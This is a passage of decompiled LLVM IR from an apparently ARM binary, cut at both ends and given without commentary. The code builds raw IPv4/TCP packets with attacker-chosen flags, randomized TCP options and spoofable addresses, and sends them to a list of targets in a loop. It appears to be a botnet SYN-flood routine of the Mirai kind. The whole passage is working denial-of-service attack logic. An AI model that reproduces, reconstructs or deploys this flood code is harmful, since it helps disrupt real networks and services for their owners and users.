  store i1 %v2_c3c0, i1* %cpsr_z.global-to-local, align 1
  %v1_c3d0 = urem i32 %v6_c2b8, 256
  store i32 %v1_c3d0, i32* @fp, align 4
  br i1 %v2_c3c0, label %dec_label_pc_c624.preheader, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c398
  %tmp52 = mul i32 %v5_c288, 256
  %v3_c3f0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c1f4, 256
  %v3_c3f4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c288, 256
  %v4_c3fc = urem i32 %tmp54, 256
  %v5_c3fc = or i32 %v4_c3fc, %v3_c3f0
  store i32 %v5_c3fc, i32* @lr, align 4
  %v1_c3f8 = mul i32 %v7_c1f4, 256
  %v4_c400 = and i32 %v1_c3f8, 65280
  %v5_c400 = or i32 %v4_c400, %v3_c3f4
  %tmp55 = mul i32 %v0_c3a4, 256
  %v3_c40c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3a8, 256
  %v3_c410 = and i32 %tmp56, 65280
  %v1_c414 = urem i32 %v6_c2b8, 2
  %v1_c418 = urem i32 %v6_c2d0, 2
  %tmp57 = udiv i32 %v0_c3a4, 256
  %v4_c41c = urem i32 %tmp57, 256
  %v5_c41c = or i32 %v4_c41c, %v3_c40c
  store i32 %v5_c41c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3a8, 256
  %v4_c420 = urem i32 %tmp58, 256
  %v5_c420 = or i32 %v4_c420, %v3_c410
  store i32 %v5_c420, i32* @r5, align 4
  %v1_c43c = urem i32 %v6_c2e8, 2
  store i32 %v1_c43c, i32* %r2.global-to-local, align 4
  %v1_c440 = urem i32 %v6_c300, 2
  store i32 %v1_c440, i32* %r3.global-to-local, align 4
  %v1_c444 = urem i32 %v6_c318, 2
  store i32 %v1_c444, i32* %r0.global-to-local, align 4
  %v1_c448 = urem i32 %v6_c330, 2
  store i32 %v1_c448, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c400, 65536
  %v4_c4d0 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c418
  %v4_c534 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c43c
  %v4_c548 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c440
  %v4_c560 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c444
  %v3_c574 = and i32 %tmp64, 2
  %v1_c4c4 = trunc i32 %v6_c20c to i8
  br label %dec_label_pc_c468

dec_label_pc_c468:                                ; preds = %bb61, %dec_label_pc_c3d8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c470 = call i32 @function_11f24(i32 128, i32 1)
  store i32 %v2_c470, i32* %r0.global-to-local, align 4
  %v3_c474 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c474, i32* %r2.global-to-local, align 4
  %v1_c478 = load i32, i32* @sb, align 4
  %v2_c478 = load i32, i32* @r4, align 4
  %v5_c478 = mul i32 %v2_c478, 4
  %v6_c478 = add i32 %v5_c478, %v1_c478
  %v7_c478 = inttoptr i32 %v6_c478 to i32*
  store i32 %v2_c470, i32* %v7_c478, align 4
  %v0_c47c = load i32, i32* %r2.global-to-local, align 4
  %v3_c47c = mul i32 %v0_c47c, 32
  store i32 %v3_c47c, i32* %r3.global-to-local, align 4
  %v0_c480 = load i32, i32* @sb, align 4
  %v4_c480 = mul i32 %v0_c47c, 4
  %v5_c480 = add i32 %v0_c480, %v4_c480
  %v6_c480 = inttoptr i32 %v5_c480 to i32*
  %v7_c480 = load i32, i32* %v6_c480, align 4
  store i32 %v7_c480, i32* %r4.global-to-local, align 4
  %v5_c484 = mul i32 %v0_c47c, 24
  store i32 %v5_c484, i32* %r3.global-to-local, align 4
  %v1_c488 = load i32, i32* @r8, align 4
  %v2_c488 = add i32 %v1_c488, %v5_c484
  store i32 %v2_c488, i32* %r0.global-to-local, align 4
  %v1_c48c = inttoptr i32 %v7_c480 to i8*
  %v2_c48c = load i8, i8* %v1_c48c, align 1
  %tmp65 = urem i8 %v2_c48c, 16
  %v1_c490 = zext i8 %tmp65 to i32
  %v1_c494 = or i32 %v1_c490, 64
  store i32 %v1_c494, i32* %r3.global-to-local, align 4
  %v1_c498 = trunc i32 %v1_c494 to i8
  store i8 %v1_c498, i8* %v1_c48c, align 1
  %v0_c49c = load i32, i32* %r4.global-to-local, align 4
  %v1_c49c = inttoptr i32 %v0_c49c to i8*
  %v2_c49c = load i8, i8* %v1_c49c, align 1
  %v1_c4a0 = and i8 %v2_c49c, -16
  %v1_c4a4 = or i8 %v1_c4a0, 5
  store i32 %v1_c238, i32* %r3.global-to-local, align 4
  store i8 %v1_c4a4, i8* %v1_c49c, align 1
  %v2_c4b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4b4 = add i32 %v2_c4b4, 1
  %v4_c4b4 = inttoptr i32 %v3_c4b4 to i8*
  store i8 %v5_c1f0, i8* %v4_c4b4, align 1
  store i32 %v1_c214, i32* %r2.global-to-local, align 4
  %v0_c4bc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4bc = icmp eq i32 %v0_c4bc, 0
  store i1 %v2_c4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c4c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c4 = add i32 %v2_c4c4, 8
  %v4_c4c4 = inttoptr i32 %v3_c4c4 to i8*
  store i8 %v1_c4c4, i8* %v4_c4c4, align 1
  %v0_c4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4c8 = trunc i32 %v0_c4c8 to i16
  %v2_c4c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4c8 = add i32 %v2_c4c8, 2
  %v4_c4c8 = inttoptr i32 %v3_c4c8 to i16*
  store i16 %v1_c4c8, i16* %v4_c4c8, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c4d0, i32* %r1.global-to-local, align 4
  %v0_c4d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4d4, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c468
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c468, %bb
  %v2_c4d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4d8 = add i32 %v2_c4d8, 9
  %v4_c4d8 = inttoptr i32 %v3_c4d8 to i8*
  store i8 6, i8* %v4_c4d8, align 1
  %v0_c4dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c4dc, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c4dc = load i32, i32* %r2.global-to-local, align 4
  %v2_c4dc = trunc i32 %v1_c4dc to i16
  %v3_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v4_c4dc = add i32 %v3_c4dc, 6
  %v5_c4dc = inttoptr i32 %v4_c4dc to i16*
  store i16 %v2_c4dc, i16* %v5_c4dc, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c34c, i32* %r2.global-to-local, align 4
  %v1_c4e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4e4 = add i32 %v1_c4e4, 12
  %v3_c4e4 = inttoptr i32 %v2_c4e4 to i32*
  store i32 %v6_c34c, i32* %v3_c4e4, align 4
  %v0_c4e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_c4e8 = add i32 %v0_c4e8, 16
  %v2_c4e8 = inttoptr i32 %v1_c4e8 to i32*
  %v3_c4e8 = load i32, i32* %v2_c4e8, align 4
  store i32 %v3_c4e8, i32* %r3.global-to-local, align 4
  %v0_c4ec = load i32, i32* %r1.global-to-local, align 4
  %v1_c4ec = trunc i32 %v0_c4ec to i16
  %v2_c4ec = load i32, i32* %r4.global-to-local, align 4
  %v3_c4ec = add i32 %v2_c4ec, 4
  %v4_c4ec = inttoptr i32 %v3_c4ec to i16*
  store i16 %v1_c4ec, i16* %v4_c4ec, align 2
  %v0_c4f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c4f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_c4f0 = add i32 %v1_c4f0, 16
  %v3_c4f0 = inttoptr i32 %v2_c4f0 to i32*
  store i32 %v0_c4f0, i32* %v3_c4f0, align 4
  %v0_c4f4 = load i32, i32* @r6, align 4
  %v1_c4f4 = trunc i32 %v0_c4f4 to i16
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 20
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i16*
  store i16 %v1_c4f4, i16* %v4_c4f4, align 2
  %v0_c4f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c4f8 = add i32 %v0_c4f8, 20
  store i32 %v1_c4f8, i32* %r1.global-to-local, align 4
  %v1_c4fc = add i32 %v0_c4f8, 32
  %v2_c4fc = inttoptr i32 %v1_c4fc to i8*
  %v3_c4fc = load i8, i8* %v2_c4fc, align 1
  %v4_c4fc = zext i8 %v3_c4fc to i32
  store i32 %v4_c4fc, i32* %r3.global-to-local, align 4
  %v1_c500 = add i32 %v0_c4f8, 33
  %v2_c500 = inttoptr i32 %v1_c500 to i8*
  %v3_c500 = load i8, i8* %v2_c500, align 1
  %v4_c500 = zext i8 %v3_c500 to i32
  store i32 %v1_c414, i32* %r0.global-to-local, align 4
  %v1_c508 = urem i8 %v3_c4fc, 16
  %v1_c50c = or i8 %v1_c508, -96
  %v1_c510 = and i32 %v4_c500, 223
  store i32 %v1_c510, i32* %r2.global-to-local, align 4
  store i8 %v1_c50c, i8* %v2_c4fc, align 1
  %v0_c518 = load i32, i32* %r2.global-to-local, align 4
  %v1_c518 = load i32, i32* %r0.global-to-local, align 4
  %v4_c518 = mul i32 %v1_c518, 32
  %v5_c518 = or i32 %v4_c518, %v0_c518
  store i32 %v5_c518, i32* %r2.global-to-local, align 4
  store i32 %v5_c3fc, i32* %r3.global-to-local, align 4
  %v1_c520 = trunc i32 %v5_c518 to i8
  %v2_c520 = load i32, i32* %r1.global-to-local, align 4
  %v3_c520 = add i32 %v2_c520, 13
  %v4_c520 = inttoptr i32 %v3_c520 to i8*
  store i8 %v1_c520, i8* %v4_c520, align 1
  %v0_c524 = load i32, i32* %r3.global-to-local, align 4
  %v1_c524 = load i32, i32* %r1.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 4
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v0_c524, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r1.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 13
  %v2_c528 = inttoptr i32 %v1_c528 to i8*
  %v3_c528 = load i8, i8* %v2_c528, align 1
  %v4_c528 = zext i8 %v3_c528 to i32
  store i32 %v1_c418, i32* %r0.global-to-local, align 4
  %v1_c530 = and i32 %v4_c528, 239
  %v5_c534 = or i32 %v1_c530, %v4_c534
  store i32 %v5_c534, i32* %r3.global-to-local, align 4
  %v1_c538 = trunc i32 %v5_c534 to i8
  store i8 %v1_c538, i8* %v2_c528, align 1
  %v0_c53c = load i32, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c53c, 13
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v1_c43c, i32* %r3.global-to-local, align 4
  %v1_c544 = and i32 %v4_c53c, 247
  %v5_c548 = or i32 %v1_c544, %v4_c548
  store i32 %v5_c548, i32* %r2.global-to-local, align 4
  %v0_c54c = load i32, i32* @r5, align 4
  %v1_c54c = trunc i32 %v0_c54c to i16
  %v3_c54c = add i32 %v0_c53c, 2
  %v4_c54c = inttoptr i32 %v3_c54c to i16*
  store i16 %v1_c54c, i16* %v4_c54c, align 2
  %v0_c550 = load i32, i32* %r2.global-to-local, align 4
  %v1_c550 = trunc i32 %v0_c550 to i8
  %v2_c550 = load i32, i32* %r1.global-to-local, align 4
  %v3_c550 = add i32 %v2_c550, 13
  %v4_c550 = inttoptr i32 %v3_c550 to i8*
  store i8 %v1_c550, i8* %v4_c550, align 1
  %v0_c554 = load i32, i32* %r1.global-to-local, align 4
  %v1_c554 = add i32 %v0_c554, 13
  %v2_c554 = inttoptr i32 %v1_c554 to i8*
  %v3_c554 = load i8, i8* %v2_c554, align 1
  %v4_c554 = zext i8 %v3_c554 to i32
  store i32 %v1_c440, i32* %r0.global-to-local, align 4
  %v1_c55c = and i32 %v4_c554, 251
  %v5_c560 = or i32 %v1_c55c, %v4_c560
  store i32 %v5_c560, i32* %r3.global-to-local, align 4
  %v1_c564 = trunc i32 %v5_c560 to i8
  store i8 %v1_c564, i8* %v2_c554, align 1
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c444, i32* %r3.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 253
  %v4_c574 = or i32 %v1_c570, %v3_c574
  store i32 %v4_c574, i32* %r2.global-to-local, align 4
  %v1_c578 = trunc i32 %v4_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c448, i32* %r0.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 254
  %v2_c588 = or i32 %v1_c584, %v1_c448
  store i32 %v2_c588, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v2_c588 to i8
  store i8 %v1_c58c, i8* %v2_c57c, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c598 = load i32, i32* %r4.global-to-local, align 4
  %v3_c598 = add i32 %v2_c598, 40
  %v4_c598 = inttoptr i32 %v3_c598 to i8*
  store i8 2, i8* %v4_c598, align 1
  %v0_c59c = load i32, i32* %r2.global-to-local, align 4
  %v1_c59c = trunc i32 %v0_c59c to i8
  %v2_c59c = load i32, i32* %r4.global-to-local, align 4
  %v3_c59c = add i32 %v2_c59c, 41
  %v4_c59c = inttoptr i32 %v3_c59c to i8*
  store i8 %v1_c59c, i8* %v4_c59c, align 1
  %v0_c5a0 = call i32 @function_e094()
  %v1_c5a4 = urem i32 %v0_c5a0, 16
  %v1_c5a8 = or i32 %v1_c5a4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5a8, 256
  %v3_c5b4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5bc = or i32 %v3_c5b4, 5
  %v1_c5c0 = trunc i32 %v5_c5bc to i16
  %v2_c5c0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5c0 = add i32 %v2_c5c0, 42
  %v4_c5c0 = inttoptr i32 %v3_c5c0 to i16*
  store i16 %v1_c5c0, i16* %v4_c5c0, align 2
  %v2_c5c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5c8 = add i32 %v2_c5c8, 44
  %v4_c5c8 = inttoptr i32 %v3_c5c8 to i8*
  store i8 4, i8* %v4_c5c8, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 46
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 8, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 47
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 45
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v0_c5e4 = call i32 @function_e094()
  store i32 %v0_c5e4, i32* %r0.global-to-local, align 4
  %v2_c5ec = load i32, i32* %r4.global-to-local, align 4
  %v3_c5ec = add i32 %v2_c5ec, 59
  %v4_c5ec = inttoptr i32 %v3_c5ec to i8*
  store i8 6, i8* %v4_c5ec, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c5fc = load i32, i32* %r4.global-to-local, align 4
  %v2_c5fc = add i32 %v1_c5fc, 48
  %v3_c5fc = inttoptr i32 %v2_c5fc to i32*
  store i32 %v0_c5e4, i32* %v3_c5fc, align 4
  %v0_c600 = load i32, i32* %r3.global-to-local, align 4
  %v1_c600 = load i32, i32* %r4.global-to-local, align 4
  %v2_c600 = add i32 %v1_c600, 52
  %v3_c600 = inttoptr i32 %v2_c600 to i32*
  store i32 %v0_c600, i32* %v3_c600, align 4
  %v0_c604 = load i32, i32* %r2.global-to-local, align 4
  %v1_c604 = trunc i32 %v0_c604 to i8
  %v2_c604 = load i32, i32* %r4.global-to-local, align 4
  %v3_c604 = add i32 %v2_c604, 56
  %v4_c604 = inttoptr i32 %v3_c604 to i8*
  store i8 %v1_c604, i8* %v4_c604, align 1
  %v0_c608 = load i32, i32* %r1.global-to-local, align 4
  %v1_c608 = trunc i32 %v0_c608 to i8
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 58
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 %v1_c608, i8* %v4_c608, align 1
  %v0_c60c = load i32, i32* %r1.global-to-local, align 4
  %v1_c60c = trunc i32 %v0_c60c to i8
  %v2_c60c = load i32, i32* %r4.global-to-local, align 4
  %v3_c60c = add i32 %v2_c60c, 57
  %v4_c60c = inttoptr i32 %v3_c60c to i8*
  store i8 %v1_c60c, i8* %v4_c60c, align 1
  %v3_c610 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c610, i32* %r3.global-to-local, align 4
  %v1_c614 = load i32, i32* %r2.global-to-local, align 4
  %v2_c614 = add i32 %v1_c614, %v3_c610
  store i32 %v2_c614, i32* @r4, align 4
  %v1_c618 = load i32, i32* @r7, align 4
  %v9_c618 = icmp eq i32 %v2_c614, %v1_c618
  store i1 %v9_c618, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c614, i32* %stack_var_-44, align 4
  %v5_c620 = icmp slt i32 %v2_c614, %v1_c618
  br i1 %v5_c620, label %dec_label_pc_c468, label %dec_label_pc_c624.preheader

dec_label_pc_c624.preheader:                      ; preds = %bb61, %dec_label_pc_c398
  %v0_c6286 = phi i32 [ 0, %dec_label_pc_c398 ], [ %v1_c618, %bb61 ]
  %v3_c7a0 = icmp eq i32 %v6_c34c, -1
  %v8_c7a0 = icmp eq i32 %v6_c34c, -1
  %v3_c670 = icmp eq i32 %v3_c3b4, 65535
  br label %dec_label_pc_c624

dec_label_pc_c624:                                ; preds = %dec_label_pc_c624, %dec_label_pc_c734, %dec_label_pc_c624.preheader
  %v0_c628 = phi i32 [ %v0_c6286, %dec_label_pc_c624.preheader ], [ 0, %dec_label_pc_c734 ], [ 0, %dec_label_pc_c624 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c628 = icmp eq i32 %v0_c628, 0
  store i1 %v2_c628, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c628, label %dec_label_pc_c624, label %dec_label_pc_c634

dec_label_pc_c634:                                ; preds = %dec_label_pc_c624, %dec_label_pc_c734
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c638

dec_label_pc_c638:                                ; preds = %dec_label_pc_c6b0, %dec_label_pc_c634
  %v1_c648 = phi i32 [ %v1_c724, %dec_label_pc_c6b0 ], [ 0, %dec_label_pc_c634 ]
  %v5_c63c = mul i32 %v1_c648, 24
  %v1_c640 = load i32, i32* @r8, align 4
  %v2_c640 = add i32 %v1_c640, %v5_c63c
  store i32 %v2_c640, i32* %r3.global-to-local, align 4
  %v1_c644 = add i32 %v2_c640, 20
  %v2_c644 = inttoptr i32 %v1_c644 to i8*
  %v3_c644 = load i8, i8* %v2_c644, align 1
  %v4_c644 = zext i8 %v3_c644 to i32
  store i32 %v4_c644, i32* %r2.global-to-local, align 4
  %v0_c648 = load i32, i32* @sb, align 4
  %v4_c648 = mul i32 %v1_c648, 4
  %v5_c648 = add i32 %v0_c648, %v4_c648
  %v6_c648 = inttoptr i32 %v5_c648 to i32*
  %v7_c648 = load i32, i32* %v6_c648, align 4
  store i32 %v7_c648, i32* @r5, align 4
  %v7_c64c = icmp eq i8 %v3_c644, 31
  store i1 %v7_c64c, i1* %cpsr_z.global-to-local, align 1
  %v1_c650 = add i32 %v7_c648, 20
  store i32 %v1_c650, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c644, 32
  br i1 %tmp67, label %dec_label_pc_c748, label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c638
  store i32 %v6_c34c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7a0, label %dec_label_pc_c7a8, label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c748, %dec_label_pc_c658
  store i32 %v3_c3b4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c670, label %dec_label_pc_c7c4, label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c7a8, %dec_label_pc_c664
  %v1_c67c = phi i32 [ %v1_c7b8, %dec_label_pc_c7a8 ], [ 65535, %dec_label_pc_c664 ]
  store i32 %v3_c3b8, i32* %r1.global-to-local, align 4
  %v9_c67c = icmp eq i32 %v3_c3b8, %v1_c67c
  store i1 %v9_c67c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c67c, label %dec_label_pc_c7d8, label %dec_label_pc_c684

dec_label_pc_c684:                                ; preds = %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge, %dec_label_pc_c678
  %v1_c688 = phi i32 [ %v1_c688.pre, %dec_label_pc_c7c4.dec_label_pc_c684_crit_edge ], [ %v1_c67c, %dec_label_pc_c678 ]
  store i32 %v3_c3bc, i32* %r2.global-to-local, align 4
  %v9_c688 = icmp eq i32 %v3_c3bc, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c7ec, label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge, %dec_label_pc_c684
  %v1_c694 = phi i32 [ %v1_c694.pre, %dec_label_pc_c7d8.dec_label_pc_c690_crit_edge ], [ %v1_c688, %dec_label_pc_c684 ]
  store i32 %v5_c288, i32* %r3.global-to-local, align 4
  %v9_c694 = icmp eq i32 %v5_c288, %v1_c694
  store i1 %v9_c694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c694, label %dec_label_pc_c800, label %dec_label_pc_c69c

dec_label_pc_c69c:                                ; preds = %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge, %dec_label_pc_c690
  %v1_c6a0 = phi i32 [ %v1_c6a0.pre, %dec_label_pc_c7ec.dec_label_pc_c69c_crit_edge ], [ %v1_c694, %dec_label_pc_c690 ]
  store i32 %v6_c2a0, i32* %r0.global-to-local, align 4
  %v9_c6a0 = icmp eq i32 %v6_c2a0, %v1_c6a0
  store i1 %v9_c6a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6a0, label %dec_label_pc_c814, label %dec_label_pc_c6a8

dec_label_pc_c6a8:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c69c
  %v0_c6a8 = load i32, i32* @fp, align 4
  %v2_c6a8 = icmp eq i32 %v0_c6a8, 0
  store i1 %v2_c6a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6a8, label %dec_label_pc_c6b0, label %dec_label_pc_c824

dec_label_pc_c6b0:                                ; preds = %dec_label_pc_c6a8, %dec_label_pc_c814, %dec_label_pc_c824
  %v2_c6b4 = load i32, i32* @r5, align 4
  %v3_c6b4 = add i32 %v2_c6b4, 10
  %v4_c6b4 = inttoptr i32 %v3_c6b4 to i16*
  store i16 0, i16* %v4_c6b4, align 2
  %v0_c6b8 = load i32, i32* @r5, align 4
  store i32 %v0_c6b8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c6c0 = call i32 @function_c848(i32 %v0_c6b8, i32 20)
  %v3_c6c0 = trunc i32 %v2_c6c0 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c6c8 = load i32, i32* @r5, align 4
  %v4_c6c8 = add i32 %v3_c6c8, 10
  %v5_c6c8 = inttoptr i32 %v4_c6c8 to i16*
  store i16 %v3_c6c0, i16* %v5_c6c8, align 2
  %v0_c6cc = load i32, i32* @r6, align 4
  store i32 %v0_c6cc, i32* @r1, align 4
  %v0_c6d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6d0 = trunc i32 %v0_c6d0 to i16
  %v3_c6d0 = add i32 %v0_c6cc, 16
  %v4_c6d0 = inttoptr i32 %v3_c6d0 to i16*
  store i16 %v1_c6d0, i16* %v4_c6d0, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c6dc = load i32, i32* @r5, align 4
  store i32 %v0_c6dc, i32* %r0.global-to-local, align 4
  %v4_c6e0 = call i32 @function_c898(i32 %v0_c6dc, i32 %v0_c6cc, i32 10240, i32 40)
  %v5_c6e0 = trunc i32 %v4_c6e0 to i16
  store i32 %v4_c6e0, i32* %r0.global-to-local, align 4
  %v3_c6e4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c6e4, i32* %r3.global-to-local, align 4
  %v3_c6e8 = mul i32 %v3_c6e4, 32
  store i32 %v3_c6e8, i32* %lr.global-to-local, align 4
  %v3_c6ec = load i32, i32* @r6, align 4
  %v4_c6ec = add i32 %v3_c6ec, 16
  %v5_c6ec = inttoptr i32 %v4_c6ec to i16*
  store i16 %v5_c6e0, i16* %v5_c6ec, align 2
  %v0_c6f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_c6f0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c6f0, -8
  %v5_c6f0 = add i32 %v0_c6f0, %tmp68
  store i32 %v5_c6f0, i32* %lr.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r6, align 4
  %v1_c6f4 = add i32 %v0_c6f4, 2
  %v2_c6f4 = inttoptr i32 %v1_c6f4 to i16*
  %v3_c6f4 = load i16, i16* %v2_c6f4, align 2
  %v1_c6f8 = load i32, i32* @r8, align 4
  %v2_c6f8 = add i32 %v1_c6f8, %v5_c6f0
  store i32 %v2_c6f8, i32* @lr, align 4
  %v3_c6fc = add i32 %v2_c6f8, 2
  %v4_c6fc = inttoptr i32 %v3_c6fc to i16*
  store i16 %v3_c6f4, i16* %v4_c6fc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c708 = load i32, i32* @r5, align 4
  store i32 %v0_c708, i32* %r1.global-to-local, align 4
  %v0_c70c = load i32, i32* @sl, align 4
  store i32 %v0_c70c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c714 = load i32, i32* @lr, align 4
  %v6_c71c = call i32 @function_11338(i32 %v0_c70c, i32 %v0_c708, i32 60, i32 16384, i32 %v0_c714, i32 16)
  %v3_c720 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c720, i32* %r3.global-to-local, align 4
  %v1_c724 = add i32 %v3_c720, 1
  store i32 %v1_c724, i32* %r0.global-to-local, align 4
  %v1_c728 = load i32, i32* @r7, align 4
  %v9_c728 = icmp eq i32 %v1_c724, %v1_c728
  store i1 %v9_c728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c724, i32* %stack_var_-44, align 4
  %v5_c730 = icmp slt i32 %v1_c724, %v1_c728
  br i1 %v5_c730, label %dec_label_pc_c638, label %dec_label_pc_c734

dec_label_pc_c734:                                ; preds = %dec_label_pc_c6b0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c738 = icmp eq i32 %v1_c728, 0
  store i1 %v2_c738, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c738, label %dec_label_pc_c624, label %dec_label_pc_c634

dec_label_pc_c748:                                ; preds = %dec_label_pc_c638
  %v1_c748 = add i32 %v2_c640, 16
  %v2_c748 = inttoptr i32 %v1_c748 to i32*
  %v3_c748 = load i32, i32* %v2_c748, align 4
  store i32 %v3_c748, i32* %r4.global-to-local, align 4
  %v0_c74c = call i32 @function_e094()
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
